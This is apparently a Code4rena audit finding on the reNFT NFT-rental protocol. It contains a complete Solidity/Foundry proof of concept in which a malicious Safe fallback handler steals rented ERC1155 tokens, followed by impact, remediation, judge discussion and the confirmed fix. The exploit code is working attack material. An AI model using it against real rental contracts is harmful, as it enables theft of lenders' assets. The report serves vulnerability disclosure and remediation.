_createSeaportFulfillment(Fulfillment storage storageFulfillment,Fulfillment memory fulfillment) private {// push the offer components to storagefor (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);}// push the consideration components to storagefor (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {storageFulfillment.considerationComponents.push(fulfillment.considerationComponents[i]);}}function _seaportItemTypeToRentalItemType(SeaportItemType seaportItemType) internal pure returns (RentalItemType) {if (seaportItemType == SeaportItemType.ERC20) {return RentalItemType.ERC20;} else if (seaportItemType == SeaportItemType.ERC721) {return RentalItemType.ERC721;} else if (seaportItemType == SeaportItemType.ERC1155) {return RentalItemType.ERC1155;} else {revert("seaport item type not supported");}}function _createRentalOrder(OrderToFulfill memory orderToFulfill) internal view returns (RentalOrder memory rentalOrder) {// get the order parametersOrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;// get the payloadRentPayload memory payload = orderToFulfill.payload;// get the metadataOrderMetadata memory metadata = payload.metadata;// construct a rental orderrentalOrder = RentalOrder({seaportOrderHash: orderToFulfill.orderHash,items: new Item[](parameters.offer.length + parameters.consideration.length),hooks: metadata.hooks,orderType: metadata.orderType,lender: parameters.offerer,renter: payload.intendedFulfiller,rentalWallet: payload.fulfillment.recipient,startTimestamp: block.timestamp,endTimestamp: block.timestamp + metadata.rentDuration});// for each new offer item being rented, create a new item struct to add to the rental orderfor (uint256 i = 0; i < parameters.offer.length; i++) {// PAYEE orders cannot have offer itemsrequire(metadata.orderType != OrderType.PAYEE,"TEST: cannot have offer items in PAYEE order");// get the offer itemOfferItem memory offerItem = parameters.offer[i];// determine the item typeRentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);// determine which entity the payment will settle toSettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20? SettleTo.RENTER: SettleTo.LENDER;// create a new rental itemrentalOrder.items[i] = Item({itemType: itemType,settleTo: settleTo,token: offerItem.token,amount: offerItem.startAmount,identifier: offerItem.identifierOrCriteria});}// for each consideration item in return, create a new item struct to add to the rental orderfor (uint256 i = 0; i < parameters.consideration.length; i++) {// PAY orders cannot have consideration itemsrequire(metadata.orderType != OrderType.PAY,"TEST: cannot have consideration items in PAY order");// get the offer itemConsiderationItem memory considerationItem = parameters.consideration[i];// determine the item typeRentalItemType itemType = _seaportItemTypeToRentalItemType(considerationItem.itemType);// determine which entity the payment will settle toSettleTo settleTo = metadata.orderType == OrderType.PAYEE &&considerationItem.itemType == SeaportItemType.ERC20? SettleTo.RENTER: SettleTo.LENDER;// calculate item index offsetuint256 itemIndex = i + parameters.offer.length;// create a new payment itemrentalOrder.items[itemIndex] = Item({itemType: itemType,settleTo: settleTo,token: considerationItem.token,amount: considerationItem.startAmount,identifier: considerationItem.identifierOrCriteria});}}function _signProtocolOrder(uint256 signerPrivateKey,bytes32 payloadHash) internal view returns (bytes memory signature) {// fetch domain separator from create policybytes32 domainSeparator = create.domainSeparator();// sign the EIP-712 digest(uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey,domainSeparator.toTypedDataHash(payloadHash));// encode the signaturesignature = abi.encodePacked(r, s, v);}///////////////////////////////////////////////////////////////////////////////////                            Fulfillment Amendments                           ///////////////////////////////////////////////////////////////////////////////////function withFulfiller(ProtocolAccount memory _fulfiller) internal {fulfiller = _fulfiller;}function withRecipient(address _recipient) internal {seaportRecipient = _recipient;}function withAdvancedOrder(AdvancedOrder memory _advancedOrder,uint256 orderIndex) internal {// get a storage pointer to the order to fulfillOrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];// set the new advanced order_createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);}function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {// get a pointer to a new seaport fulfillmentFulfillment storage fulfillment = seaportMatchOrderFulfillments.push();// set the fulfillment_createSeaportFulfillment(fulfillment,Fulfillment({offerComponents: _fulfillment.offerComponents,considerationComponents: _fulfillment.considerationComponents}));}function withSeaportMatchOrderFulfillments(Fulfillment[] memory fulfillments) internal {// reset all current seaport match order fulfillmentsresetSeaportMatchOrderFulfillments();// add the new offer items to storagefor (uint256 i = 0; i < fulfillments.length; i++) {// get a pointer to a new seaport fulfillmentFulfillment storage fulfillment = seaportMatchOrderFulfillments.push();// set the fulfillment_createSeaportFulfillment(fulfillment,Fulfillment({offerComponents: fulfillments[i].offerComponents,considerationComponents: fulfillments[i].considerationComponents}));}}function withBaseOrderFulfillmentComponents() internal {// create offer fulfillments. We need to specify which offer items can be aggregated// into one transaction. For example, 2 different orders where the same seller is offering// the same item in each.//// Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment// is created for each order.for (uint256 i = 0; i < ordersToFulfill.length; i++) {// get a pointer to a new offer fulfillment array. This array will contain indexes of// orders and items which are all grouped on whether they can be combined in a single transferFrom()FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments.push();// number of offer items in the orderuint256 offerItemsInOrder = ordersToFulfill[i].advancedOrder.parameters.offer.length;// add a single fulfillment component for each offer item in the orderfor (uint256 j = 0; j < offerItemsInOrder; j++) {offerFulfillments.push(FulfillmentComponent({orderIndex: i, itemIndex: j}));}}// create consideration fulfillments. We need to specify which consideration items can be aggregated// into one transaction. For example, 3 different orders where the same fungible consideration items are// expected in return.//// get a pointer to a new offer fulfillment array. This array will contain indexes of// orders and items which are all grouped on whether they can be combined in a single transferFrom()FulfillmentComponent[]storage considerationFulfillments = seaportConsiderationFulfillments.push();// BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because// all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the// ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer// of ERC20 tokens from the fulfiller EOA to the payment escrow contract.//// put all fulfillments into one which can be an aggregated transferfor (uint256 i = 0; i < ordersToFulfill.length; i++) {considerationFulfillments.push(FulfillmentComponent({orderIndex: i, itemIndex: 0}));}}function withLinkedPayAndPayeeOrders(uint256 payOrderIndex,uint256 payeeOrderIndex) internal {// get the PAYEE orderOrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex].advancedOrder.parameters;// For each consideration item in the PAYEE order, a fulfillment should be// constructed with a corresponding item from the PAY order's offer items.for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {// define the offer componentsFulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);offerComponents[0] = FulfillmentComponent({orderIndex: payOrderIndex,itemIndex: i});// define the consideration componentsFulfillmentComponent[]memory considerationComponents = new FulfillmentComponent[](1);considerationComponents[0] = FulfillmentComponent({orderIndex: payeeOrderIndex,itemIndex: i});// get a pointer to a new seaport fulfillmentFulfillment storage fulfillment = seaportMatchOrderFulfillments.push();// set the fulfillment_createSeaportFulfillment(fulfillment,Fulfillment({offerComponents: offerComponents,considerationComponents: considerationComponents}));}}function resetFulfiller() internal {delete fulfiller;}function resetOrdersToFulfill() internal {delete ordersToFulfill;}function resetSeaportMatchOrderFulfillments() internal {delete seaportMatchOrderFulfillments;}///////////////////////////////////////////////////////////////////////////////////                           Fulfillment Finalization                          ///////////////////////////////////////////////////////////////////////////////////function _finalizePayOrderFulfillment(bytes memory expectedError)privatereturns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder){// get the orders to fulfillOrderToFulfill memory payOrder = ordersToFulfill[0];OrderToFulfill memory payeeOrder = ordersToFulfill[1];// create rental orderspayRentalOrder = _createRentalOrder(payOrder);payeeRentalOrder = _createRentalOrder(payeeOrder);// expect an error if error data was providedif (expectedError.length != 0) {vm.expectRevert(expectedError);}// otherwise, expect the relevant event to be emitted.else {vm.expectEmit({emitter: address(create)});emit Events.RentalOrderStarted(create.getRentalOrderHash(payRentalOrder),payOrder.payload.metadata.emittedExtraData,payRentalOrder.seaportOrderHash,payRentalOrder.items,payRentalOrder.hooks,payRentalOrder.orderType,payRentalOrder.lender,payRentalOrder.renter,payRentalOrder.rentalWallet,payRentalOrder.startTimestamp,payRentalOrder.endTimestamp);}// the offerer of the PAYEE order fulfills the orders.vm.prank(fulfiller.addr);// fulfill the ordersseaport.matchAdvancedOrders(_deconstructOrdersToFulfill(),new CriteriaResolver[](0),seaportMatchOrderFulfillments,seaportRecipient);// clear structsresetFulfiller();resetOrdersToFulfill();resetSeaportMatchOrderFulfillments();}function finalizePayOrderFulfillment()internalreturns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder){(payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(""));}function finalizePayOrderFulfillmentWithError(bytes memory expectedError)internalreturns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder){(payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);}function _finalizeBaseOrderFulfillment(bytes memory expectedError) private returns (RentalOrder memory rentalOrder) {// get the order to fulfillOrderToFulfill memory baseOrder = ordersToFulfill[0];// create a rental orderrentalOrder = _createRentalOrder(baseOrder);// expect an error if error data was providedif (expectedError.length != 0) {vm.expectRevert(expectedError);}// otherwise, expect the relevant event to be emitted.else {vm.expectEmit({emitter: address(create)});emit Events.RentalOrderStarted(create.getRentalOrderHash(rentalOrder),baseOrder.payload.metadata.emittedExtraData,rentalOrder.seaportOrderHash,rentalOrder.items,rentalOrder.hooks,rentalOrder.orderType,rentalOrder.lender,rentalOrder.renter,rentalOrder.rentalWallet,rentalOrder.startTimestamp,rentalOrder.endTimestamp);}// the owner of the rental wallet fulfills the advanced order, and marks the rental wallet// as the recipientvm.prank(fulfiller.addr);seaport.fulfillAdvancedOrder(baseOrder.advancedOrder,new CriteriaResolver[](0),conduitKey,seaportRecipient);// clear structsresetFulfiller();resetOrdersToFulfill();resetSeaportMatchOrderFulfillments();}function finalizeBaseOrderFulfillment()internalreturns (RentalOrder memory rentalOrder){rentalOrder = _finalizeBaseOrderFulfillment(bytes(""));}function finalizeBaseOrderFulfillmentWithError(bytes memory expectedError) internal returns (RentalOrder memory rentalOrder) {rentalOrder = _finalizeBaseOrderFulfillment(expectedError);}function finalizeBaseOrdersFulfillment()internalreturns (RentalOrder[] memory rentalOrders){// Instantiate rental ordersuint256 numOrdersToFulfill = ordersToFulfill.length;rentalOrders = new RentalOrder[](numOrdersToFulfill);// convert each order to fulfill into a rental orderfor (uint256 i = 0; i < numOrdersToFulfill; i++) {rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);}// Expect the relevant events to be emitted.for (uint256 i = 0; i < rentalOrders.length; i++) {vm.expectEmit({emitter: address(create)});emit Events.RentalOrderStarted(create.getRentalOrderHash(rentalOrders[i]),ordersToFulfill[i].payload.metadata.emittedExtraData,rentalOrders[i].seaportOrderHash,rentalOrders[i].items,rentalOrders[i].hooks,rentalOrders[i].orderType,rentalOrders[i].lender,rentalOrders[i].renter,rentalOrders[i].rentalWallet,rentalOrders[i].startTimestamp,rentalOrders[i].endTimestamp);}// the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet// as the recipientvm.prank(fulfiller.addr);seaport.fulfillAvailableAdvancedOrders(_deconstructOrdersToFulfill(),new CriteriaResolver[](0),seaportOfferFulfillments,seaportConsiderationFulfillments,conduitKey,seaportRecipient,ordersToFulfill.length);// clear structsresetFulfiller();resetOrdersToFulfill();resetSeaportMatchOrderFulfillments();}function finalizePayOrdersFulfillment()internalreturns (RentalOrder[] memory rentalOrders){// Instantiate rental ordersuint256 numOrdersToFulfill = ordersToFulfill.length;rentalOrders = new RentalOrder[](numOrdersToFulfill);// convert each order to fulfill into a rental orderfor (uint256 i = 0; i < numOrdersToFulfill; i++) {rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);}// Expect the relevant events to be emitted.for (uint256 i = 0; i < rentalOrders.length; i++) {// only expect the event if its a PAY orderif (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {vm.expectEmit({emitter: address(create)});emit Events.RentalOrderStarted(create.getRentalOrderHash(rentalOrders[i]),ordersToFulfill[i].payload.metadata.emittedExtraData,rentalOrders[i].seaportOrderHash,rentalOrders[i].items,rentalOrders[i].hooks,rentalOrders[i].orderType,rentalOrders[i].lender,rentalOrders[i].renter,rentalOrders[i].rentalWallet,rentalOrders[i].startTimestamp,rentalOrders[i].endTimestamp);}}// the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter// what the recipient address isvm.prank(fulfiller.addr);seaport.matchAdvancedOrders(_deconstructOrdersToFulfill(),new CriteriaResolver[](0),seaportMatchOrderFulfillments,seaportRecipient);// clear structsresetFulfiller();resetOrdersToFulfill();resetSeaportMatchOrderFulfillments();}function _deconstructOrdersToFulfill()privateviewreturns (AdvancedOrder[] memory advancedOrders){// get the length of the orders to fulfilladvancedOrders = new AdvancedOrder[](ordersToFulfill.length);// build up the advanced ordersfor (uint256 i = 0; i < ordersToFulfill.length; i++) {advancedOrders[i] = ordersToFulfill[i].advancedOrder;}}}contract SetupReNFT is OrderFulfiller {}
Exploit.sol// SPDX-License-Identifier: BUSL-1.1pragma solidity ^0.8.20;import {Order,FulfillmentComponent,Fulfillment,ItemType as SeaportItemType} from "@seaport-types/lib/ConsiderationStructs.sol";import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";import {SetupReNFT} from "./SetupExploit.sol";import {Assertions} from "@test/utils/Assertions.sol";import {Constants} from "@test/utils/Constants.sol";import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";import {Enum} from "@safe-contracts/common/Enum.sol";import "forge-std/console.sol";contract Exploit is SetupReNFT, Assertions, Constants {function test_ERC1155_Exploit() public {// Impersonate the attackervm.startPrank(attacker.addr);// The custom fallback handler the attacker created.CustomFallbackHandler customFallbackHandler = new CustomFallbackHandler(attacker.addr);// Set the attacker's safe address on the fallback handler which the fallback handler will communicate with.customFallbackHandler.setSafeAddr(address(attacker.safe));// Set the address of the token which the attacker wants to hijack on the fallback handler.customFallbackHandler.setTokenToHijackAddr(address(erc1155s[0]));// The `setFallbackHandler` TXbytes memory transaction = abi.encodeWithSelector(Safe.setFallbackHandler.selector,address(customFallbackHandler));// The signature of the `setFallbackHandler` TXbytes memory transactionSignature = SafeUtils.signTransaction(address(attacker.safe),attacker.privateKey,address(attacker.safe),transaction);// Execute the transaction on attacker's safeSafeUtils.executeTransaction(address(attacker.safe),address(attacker.safe),transaction,transactionSignature);// The malicious TX which the custom fallback handler will execute when `onERC1155Received` is called.bytes memory hijackTX = abi.encodeWithSignature("safeTransferFrom(address,address,uint256,uint256,bytes)",address(attacker.safe),address(attacker.addr),0,100,"");// Get the signature of the malicious TX.transactionSignature = SafeUtils.signTransaction(address(attacker.safe),attacker.privateKey,address(address(erc1155s[0])),hijackTX);// Set the malicious TX and it's signature on the custom fallback handler contract so that it sends itcustomFallbackHandler.setSignatureAndTransaction(transactionSignature, hijackTX);vm.stopPrank();/////////////////////////////////////////////// Order Creation & Fulfillment simulation ///////////////////////////////////////////////// Alice creates a BASE ordercreateOrder({offerer: alice,orderType: OrderType.BASE,erc721Offers: 0,erc1155Offers: 1,erc20Offers: 0,erc721Considerations: 0,erc1155Considerations: 0,erc20Considerations: 1});// Finalize the order creation(Order memory order,bytes32 orderHash,OrderMetadata memory metadata) = finalizeOrder();// Create an order fulfillmentcreateOrderFulfillment({_fulfiller: attacker,order: order,orderHash: orderHash,metadata: metadata});// Finalize the base order fulfillmentRentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();// get the rental order hashbytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);////////////////////////////// Token Theft Proof      //////////////////////////////uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);if (attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");}// Assert that the rental order was storedassertEq(STORE.orders(rentalOrderHash), true);// Assert that the token is in storageassertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);// assert that the fulfiller made a paymentassertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));// assert that a payment was made to the escrow contractassertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));// assert that a payment was synced properly in the escrow contractassertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));}}interface Safe {function execTransaction(address to,uint256 value,bytes calldata data,Enum.Operation operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address payable refundReceiver,bytes memory signatures) external payable returns (bool success);function setFallbackHandler(address handler) external;function addOwnerWithThreshold(address owner, uint256 threshold) external;}contract CustomFallbackHandler {address private owner; // The address of the attacker.address private safe; // The address of the attacker's safe.address private tokenToHijack; // The address of the token which the attacker wants to hijack.bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the tokenconstructor(address _owner) {owner = _owner;}function onERC1155Received(address,address,uint256,uint256,bytes calldata) external returns(bytes4) {_transferHijackedTokensToOwner();return 0xf23a6e61;}function _transferHijackedTokensToOwner() internal returns(bool) {SafeUtils.executeTransaction(address(safe),address(tokenToHijack),maliciousSafeTransaction,maliciousSafeTransactionSignature);return true;}function setSafeAddr(address _safe) external onlyOwner {safe = _safe;}function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {tokenToHijack = _tokenAddr;}function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {maliciousSafeTransactionSignature = _signature;maliciousSafeTransaction = _transaction;}modifier onlyOwner {require(msg.sender == owner);_;}}

Impact

An attacker can hijack any ERC1155 token he rents, and the lender won’t be able to get the rental funds he should get after rental expiry.

Remediation

The main problem is that the token transferral occurs before the rental is registered, so the fix I propose is that the lender’s ERC1155 tokens be transferred first to a trusted contract which registers the rental and then the trusted contract sends the ERC1155 tokens to the borrower’s rental safe after ensuring the rental was registered. This fix would break this exploit.

0xean (Judge) commented:
In short, the main issue is thathttps://github.com/code-423n4/2024-01-renft-findings/issues/593doesn’t validate the address supplied to setFallbackHandler as it should, and the main issue with this reported bug is that tokens are transferred directly to the rental safe prior to being registered.I think this is correct and why these issues should remain distinct.  Currently my point of view is:fixing the guard is requiredfixing the ability to interact before the token is registered is also required2 fixes, 2 issues.  Would welcome one last comment from @0xA5DF prior to calling this final
Alec1017 (reNFT) confirmed and commented:
Totally agree with @0xean that these are 2 distinct issues
Note: To see full discussion, seehere.
reNFT mitigated:
The PRhere- Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.
Status:Mitigation confirmed. Full details in reports fromEV_om,sin1st3r__andjuancito.